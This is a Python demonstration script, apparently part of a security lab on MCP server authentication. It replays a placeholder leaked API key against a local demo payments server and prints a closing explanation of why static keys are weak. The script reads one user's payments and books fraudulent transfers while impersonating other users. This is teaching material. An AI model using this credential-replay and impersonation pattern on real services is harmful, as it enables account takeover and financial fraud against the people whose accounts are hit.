"""
Attack #1: Leaked API Key Replay
---------------------------------
Scenario: The API key was committed to git, appeared in a log file,
or was shared in a Slack message. An attacker now replays it from any
machine. No rotation has happened yet.

What this proves:
  - One leaked static credential = unlimited access to ALL tools, ALL users
  - The server cannot distinguish the legitimate agent from an attacker
  - The attacker can impersonate ANY user (user_id is just a parameter)
  - There is no expiry, no scope limit, no revocation without manual rotation

Run:
  cd attacks/
  pip install -r requirements.txt
  python 01_leaked_key_replay.py

Expected: every call succeeds — the server has no way to tell this apart
from a legitimate request.
"""

import asyncio
import sys

import httpx
from mcp import ClientSession
from mcp.client.streamable_http import streamable_http_client

SERVER_URL = "http://127.0.0.1:8001/mcp"

# Attacker obtained this key from a public git commit / leaked .env / log file.
LEAKED_KEY = "sk-apikey-demo-1234-definitely-not-a-secret"

RESET = "\033[0m"
RED   = "\033[31m"
GREEN = "\033[32m"
BOLD  = "\033[1m"
DIM   = "\033[2m"


def fail(msg: str):
    print(f"  {RED}✗ ATTACK SUCCEEDED{RESET} — {msg}")


def ok(msg: str):
    print(f"  {GREEN}✓ Server blocked it{RESET} — {msg}")


async def call(session: ClientSession, tool: str, args: dict) -> dict:
    result = await session.call_tool(tool, args)
    if result.content and hasattr(result.content[0], "text"):
        import json
        return json.loads(result.content[0].text)
    return {}


async def main():
    print()
    print(f"{BOLD}{'=' * 62}{RESET}")
    print(f"{BOLD}  Attack #1: Leaked API Key Replay{RESET}")
    print(f"{BOLD}  Target: Server #1 (server-1-apikey) on {SERVER_URL}{RESET}")
    print(f"{BOLD}{'=' * 62}{RESET}")
    print()
    print(f"{DIM}  Leaked key: {LEAKED_KEY}{RESET}")
    print()

    try:
        http = httpx.AsyncClient(headers={"X-API-Key": LEAKED_KEY})
        async with streamable_http_client(SERVER_URL, http_client=http) as (read, write, _):
            async with ClientSession(read, write) as session:
                await session.initialize()

                # ----------------------------------------------------------
                # Step 1: Read alice's payments
                # ----------------------------------------------------------
                print(f"{BOLD}[1/3] Attacker reads alice's payment history using leaked key...{RESET}")
                result = await call(session, "list_payments", {"user_id": "alice"})
                count = len(result.get("payments", []))
                fail(f"server returned {count} payments for user 'alice' — data exposed")
                print(f"      {DIM}payments: {[p['id'] for p in result.get('payments', [])]}{RESET}")
                print()

                # ----------------------------------------------------------
                # Step 2: Book a fraudulent payment as alice
                # ----------------------------------------------------------
                print(f"{BOLD}[2/3] Attacker books a fraudulent payment ON BEHALF OF alice...{RESET}")
                result = await call(session, "book_payment", {
                    "user_id": "alice",
                    "amount": 9999.00,
                    "to": "Attacker LLC",
                    "memo": "Wire transfer — definitely legit",
                })
                if result.get("ok"):
                    pid = result["payment"]["id"]
                    fail(f"booked $9,999.00 from alice's account → 'Attacker LLC' (payment_id={pid})")
                else:
                    ok(f"server rejected the booking: {result.get('error')}")
                print()

                # ----------------------------------------------------------
                # Step 3: Cross-user action — act as bob with alice's session
                # ----------------------------------------------------------
                print(f"{BOLD}[3/3] Attacker now acts as a DIFFERENT user (bob) — no user binding in the key...{RESET}")
                result = await call(session, "book_payment", {
                    "user_id": "bob",
                    "amount": 500.00,
                    "to": "Shell Company Ltd.",
                    "memo": "Consulting invoice",
                })
                if result.get("ok"):
                    pid = result["payment"]["id"]
                    fail(f"booked $500.00 from bob's account using the same key (payment_id={pid})")
                else:
                    ok(f"server rejected: {result.get('error')}")
                print()

    except Exception as exc:
        print(f"\n  [!] Could not connect to server: {exc}")
        print(f"      Make sure server-1 is running:  cd server-1-apikey && python server.py\n")
        sys.exit(1)

    print(f"{BOLD}{'=' * 62}{RESET}")
    print(f"{BOLD}  VERDICT{RESET}")
    print(f"{'=' * 62}")
    print(f"""
  One leaked static key grants unlimited access to:
    - ALL tools (read, write, cancel)
    - ALL users (alice, bob, charlie — just change user_id)
    - FOREVER (until someone manually rotates it)

  The server audit log shows the key was used, but NOT:
    - Which human approved the action
    - Which agent session initiated it
    - Whether the agent was acting on behalf of alice or bob

  Fix: rotate the key immediately. But until then, blast radius = ∞.
  See Server #2 and #3 for how narrowing the credential scope helps.
""")


if __name__ == "__main__":
    asyncio.run(main())
